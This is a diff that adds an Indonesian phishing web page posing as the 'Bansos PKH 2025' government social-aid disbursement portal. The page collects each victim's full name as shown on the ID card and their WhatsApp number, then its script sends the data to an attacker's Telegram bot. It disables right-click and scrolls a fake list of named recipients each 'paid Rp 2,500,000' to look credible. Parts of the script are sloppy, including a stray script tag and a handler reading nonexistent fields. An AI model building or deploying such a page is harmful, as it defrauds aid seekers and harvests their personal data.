@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+      <meta name="theme-color" content="#">
+    <title>BANSOS PKH 2025</title>
+    <style>
+        /* Reset dan dasar */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f9f9f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            padding: 20px;
+        }
+
+        /* Gambar utama */
+        .main-image {
+            width: 100px;
+            height: 100px;
+            margin-bottom: 10px;
+        }
+
+        /* Teks berjalan */
+        .marquee-container {
+            overflow: hidden;
+            width: 100%;
+            max-width: 350px;
+            background-color: #333;
+            color: white;
+            padding: 10px 0;
+            margin-bottom: 20px;
+            text-align: center;
+            border-radius: 5px;
+        }
+
+        .marquee-text {
+            display: inline-block;
+            white-space: nowrap;
+            animation: marquee 10s linear infinite;
+            font-size: 16px;
+        }
+
+        @keyframes marquee {
+            from {
+                transform: translateX(100%);
+            }
+            to {
+                transform: translateX(-100%);
+            }
+        }
+
+        /* Formulir input */
+        .form-container {
+            width: 100%;
+            max-width: 350px;
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            margin-bottom: 15px;
+        }
+
+        label {
+            font-size: 14px;
+            margin-bottom: 5px;
+            color: #333;
+        }
+
+        input[type="text"],
+        input[type="tel"] {
+            padding: 14px;
+            font-size: 14px;
+            border: 1px solid #006a4e;
+            border-radius: 5px;
+            outline:none;
+            font-weight:bold;
+        }
+
+        .input-group {
+            display: flex;
+            align-items: center;
+        }
+
+        .input-group span {
+            padding: 14px;
+            background-color: #ddd;
+            border: 1px solid #ddd;
+            border-right: none;
+            border-radius: 5px 0 0 5px;
+            font-size: 14px;
+            font-weight:bold;
+        }
+
+        .input-group input {
+            flex: 1;
+            border-radius: 0 5px 5px 0;
+            border-left: none;
+        }
+
+        /* Tombol lanjut */
+        .btn {
+            padding: 14px;
+            font-size: 16px;
+            color: white;
+            background-color: #3CB371;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            text-align: center;
+            margin-left:10%;
+            width: 80%;
+        }
+
+        /* Container utama */
+        .box-container {
+            width: 350px;
+            height: 300px;
+            
+            overflow: hidden;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            position: relative;
+        }
+
+        /* Slide box */
+        .slide-box {
+            display: flex;
+            flex-direction: column;
+            animation: slideUp 20s linear infinite;
+        }
+
+        /* User box */
+        .user-box {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 15px;
+            border-bottom: 1px solid #3cb371;
+            border: 1px solid #3CB371; 
+        }
+
+        /* Foto pengguna */
+        .user-photo {
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            object-fit: cover;
+            margin-right: 10px;
+            
+        }
+
+        /* Informasi pengguna */
+        .user-info {
+            flex-grow: 1;
+            padding-left: 10px;
+        }
+
+        .user-name {
+            font-size: 16px;
+            font-weight: bold;
+            color: #333;
+        }
+
+        .user-detail {
+            font-size: 14px;
+            color: #555;
+        }
+
+        /* Ikon ceklis */
+        .icon-check {
+            font-size: 20px;
+            color: green;
+        }
+
+        /* Animasi slide */
+        @keyframes slideUp {
+            0% {
+                transform: translateY(0);
+            }
+            100% {
+                transform: translateY(-100%);
+            }
+        }
+        
+        .gambar {
+            width: 100%;
+            margin-bottom: 0;
+        }
+
+        .gambar img {
+            width: 100%;
+            object-fit: cover;
+        }
+        
+        h1{
+          font-size: 17px;
+          font-weight:bold;
+          text-align: center;
+          color:#ff0000;
+        }
+         .loading {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 1000;
+            background: rgba(255, 255, 255, 0.8);
+            padding: 10px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+
+        .loading img {
+    width: 100px; 
+    height: auto; 
+}
+
+        nav {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            z-index: 1000;
+        }
+
+        nav img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+    </style>
+</head>
+<body>
+        <div class="gambar">
+        <img src="https://blogger.googleusercontent.com/img/a/AVvXsEieBW4RE2FjWq8TV2AbVSEEys5jIOCIfd7XhU6dnuIqOzkBAvS2qM3xxOxJjz83OAOgkyhf0JcxeezLYFVBvFGB_FpIk8lR8-okEKbA83QVbB031JIxx3-ZsKCrD5OnhKPP2saiQPBsOcgP8_uwQFK_rw4lMY-x0wasCqjU67TNy92MnK22e8R7t9dRy9sv" alt="Gambar Pucok">
+    </div>
+
+    <!-- Teks berjalan -->
+    <div class="marquee-container">
+        <p class="marquee-text">Selamat datang! Isi data Anda untuk melanjutkan proses pencairan.</p>
+    </div>
+
+  
+    <div class="form-container">
+      <h1>Bansos PKH 2025</h1><br>
+        <form id="userForm">
+            <div class="form-group">
+                <label for="fullName"></label>
+                <input type="text" id="fullName" name="fullName" placeholder="Masukkan nama lengkap Sesuai KTP" required>
+            </div>
+            <div class="form-group">
+                <label for="phoneNumber"></label>
+                <div class="input-group">
+                    <span>+62</span>
+                    <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="Nomor WhatsApp Aktif" required>
+                </div>
+            </div><br>
+            <button type="submit" class="btn">Lanjut</button>
+        </form>
+    </div><br>
+      <div class="loading">
+        <img src="img/successfu8.gif" alt="Loading" width="50">
+        <p></p>
+    </div>
+
+<div class="box-container">
+    <div class="slide-box">
+        <!-- Wahyu Iskandar -->
+        <div class="user-box">
+            <img src="img/aa1.jpg" alt="Wahyu Iskandar" class="user-photo">
+            <div class="user-info">
+                <p class="user-name">Wahyu Iskandar</p>
+                <p class="user-detail">Pencairan Rp 2.500.000</p>
+            </div>
+            <div class="icon-check">✅</div>
+        </div>
+        <!-- Bobie -->
+        <div class="user-box">
+            <img src="img/aa2.jpg" alt="Bobie" class="user-photo">
+            <div class="user-info">
+                <p class="user-name">Bobie</p>
+                <p class="user-detail">Pencairan Rp 2.500.000</p>
+            </div>
+            <div class="icon-check">✅</div>
+        </div>
+        <!-- Wisnu -->
+        <div class="user-box">
+            <img src="img/aa3.jpg" alt="Wisnu" class="user-photo">
+            <div class="user-info">
+                <p class="user-name">Wisnu</p>
+                <p class="user-detail">Pencairan Rp 2.500.000</p>
+            </div>
+            <div class="icon-check">✅</div>
+        </div>
+        <!-- Sudar -->
+        <div class="user-box">
+            <img src="img/aa4.jpg" alt="Sudar" class="user-photo">
+            <div class="user-info">
+                <p class="user-name">Sudar</p>
+                <p class="user-detail">Pencairan Rp 2.500.000</p>
+            </div>
+            <div class="icon-check">✅</div>
+        </div>
+        <!-- Mansur -->
+        <div class="user-box">
+            <img src="img/aa5.jpg" alt="Mansur" class="user-photo">
+            <div class="user-info">
+                <p class="user-name">Mansur</p>
+                <p class="user-detail">Pencairan Rp 2.500.000</p>
+            </div>
+            <div class="icon-check">✅</div>
+        </div>
+        <!-- Ansori -->
+        <div class="user-box">
+            <img src="img/aa6.jpg" alt="Ansori" class="user-photo">
+            <div class="user-info">
+                <p class="user-name">Ansori</p>
+                <p class="user-detail">Pencairan Rp 2.500.000</p>
+            </div>
+            <div class="icon-check">✅</div>
+        </div>
+        <!-- Paisar -->
+        <div class="user-box">
+            <img src="img/aa7.jpg" alt="Paisar" class="user-photo">
+            <div class="user-info">
+                <p class="user-name">Paisar</p>
+                <p class="user-detail">Pencairan Rp 2.500.000</p>
+            </div>
+            <div class="icon-check">✅</div>
+        </div>
+        <!-- Bela -->
+        <div class="user-box">
+            <img src="img/aa8.jpg" alt="Bela" class="user-photo">
+            <div class="user-info">
+                <p class="user-name">Bela</p>
+                <p class="user-detail">Pencairan Rp 2.500.000</p>
+            </div>
+            <div class="icon-check">✅</div>
+        </div>
+        <!-- Tania -->
+        <div class="user-box">
+            <img src="img/aa9.jpg" alt="Tania" class="user-photo">
+            <div class="user-info">
+                <p class="user-name">Tania</p>
+                <p class="user-detail">Pencairan Rp 2.500.000</p>
+            </div>
+            <div class="icon-check">✅</div>
+        </div>
+        <!-- Mita -->
+        <div class="user-box">
+            <img src="img/aa10.jpg" alt="Mita" class="user-photo">
+            <div class="user-info">
+                <p class="user-name">Mita</p>
+                <p class="user-detail">Pencairan Rp 2.500.000</p>
+            </div>
+            <div class="icon-check">✅</div>
+        </div>
+    </div>
+</div>
+ <nav>
+        <a href="https://example.com">
+            <img src="img/nav.jpg" alt="Navigasi Bawah">
+        </a>
+    </nav>
+        <script>
+        <script src="config.js"></script> <!-- Tambahkan config.js -->
+<script>
+    const form = document.getElementById('userForm');
+    const loading = document.querySelector('.loading');
+
+    form.addEventListener('submit', (e) => {
+        e.preventDefault();
+
+        // Ambil nilai input
+        let fullName = document.getElementById("fullName").value.trim();
+        let phoneNumber = document.getElementById("phoneNumber").value.trim();
+
+        if (fullName === "" || phoneNumber === "") {
+            alert("Harap isi semua kolom!");
+            return;
+        }
+
+        // Tampilkan loading GIF
+        loading.style.display = 'block';
+
+        // Format pesan
+        let message = `📩 *Data Baru Diterima* 📩\n\n`
+                    + `👤 *Nama:* ${fullName}\n`
+                    + `📞 *Nomor:* +62${phoneNumber}`;
+
+        // Kirim ke Telegram
+        let telegramAPI = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        let params = {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: "Markdown"
+        };
+
+        fetch(telegramAPI, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(params)
+        })
+        .then(response => response.json())
+        .then(data => {
+            loading.style.display = 'none'; // Sembunyikan loading setelah selesai
+            if (data.ok) {
+                window.location.href = "halaman-berikutnya.html"; // Redirect setelah sukses
+            } else {
+                alert("Gagal mengirim data ke Telegram.");
+            }
+        })
+        .catch(error => {
+            loading.style.display = 'none';
+            console.error("Error:", error);
+        });
+    });
+
+    // Mencegah klik kanan
+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+    });
+
+
+    document.getElementById("userForm").addEventListener("submit", function () {
+        let nama = document.getElementById("nama").value;
+        let nomorHP = document.getElementById("nomorHP").value;
+
+        localStorage.setItem("nama", nama);
+        localStorage.setItem("nomorTelepon", nomorHP);
+    });
+
+
+    </script>
+
+</body>
+</html>
